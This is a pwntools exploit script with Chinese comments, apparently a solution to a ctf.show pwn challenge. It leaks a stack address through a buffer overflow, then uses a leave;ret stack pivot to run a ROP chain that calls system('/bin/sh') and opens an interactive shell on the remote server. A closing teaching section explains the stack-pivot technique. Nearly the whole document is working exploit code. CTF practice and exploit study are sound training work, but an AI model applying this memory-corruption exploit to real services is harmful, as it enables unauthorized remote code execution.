from pwn import *

# 连接到目标服务器
p = remote('pwn.challenge.ctf.show', 28144)
# 加载ELF文件，用于获取函数地址
elf = ELF('../code/pwn')

# leave_ret gadget地址，用于执行栈迁移
# leave = mov esp, ebp; pop ebp
# ret = pop eip
# 这个gadget可以将栈顶设置为ebp指向的位置
leave_ret = 0x8048766

# system函数的地址，用于执行system('/bin/sh')
sys_addr = 0x8048400

# 栈溢出的偏移量，计算到ebp的距离
offset = 0x28

# 接收服务器的提示信息
p.recvuntil('codename:')

# 构造第一个payload，用于泄露ebp的值
# 填充offset-4字节到ebp-4的位置，然后写入'show'作为标记
# 这样当程序打印时，会显示出ebp的值
payload1 = b'a' * (offset - 0x4) + b'show'
p.sendline(payload1)

# 接收输出，直到'show'标记
p.recvuntil('show')

# 读取4字节作为ebp的值，补全为4字节并转换为32位无符号整数
ebp = u32(p.recv(4).ljust(4, b'\x00'))
print(f"Leaked ebp: 0x{ebp:x}")

# 计算新栈的地址
# buf是我们控制的缓冲区地址，位于ebp下方0x38处
# 这个地址将作为新的栈顶
buf = ebp - 0x38
print(f"Calculated buf address: 0x{buf:x}")

# 构造第二个payload，实现栈迁移和ROP链
# 构造ROP链：system("/bin/sh")
# - sys_addr: system函数地址
# - 0: 占位符，对应system函数的返回地址
# - buf + 12: 指向"/bin/sh"字符串的地址
# - "/bin/sh\x00": 执行命令的字符串
# 然后填充到0x28字节（栈帧大小）
# 最后写入新的ebp值，指向buf-4
# 当leave_ret执行时：
# 1. leave: esp = ebp (现在ebp是buf-4)，然后pop ebp (弹出buf-4作为新的ebp)
# 2. ret: pop eip (弹出sys_addr，执行system函数)
payload2 = (p32(sys_addr) + p32(0) + p32(buf + 12) + b'/bin/sh\x00').ljust(0x28, b'a') + p32(buf - 4)
print(f"Payload2 length: {len(payload2)}")
p.sendline(payload2)

# 进入交互模式，获取shell
p.interactive()

"""
【知识点讲解】
1. 题目类型：栈迁移 - Stack Pivot
2. 核心原理：
   - 当栈空间不足以构造ROP链时
   - 将栈迁移到其他可控的内存区域
   - 通常使用leave_ret gadget实现
3. leave_ret指令序列：
   - leave = mov esp, ebp; pop ebp
   - ret = pop eip
   - 可以控制ebp来设置新的栈顶
4. 迁移流程：
   - 将新的栈地址写入某个位置
   - 使用leave_ret将esp指向新栈
   - 在新栈上执行ROP链
5. 应用场景：
   - 栈溢出空间不足
   - 需要多次ROP链
   - BSS段写入ROP链后迁移
"""
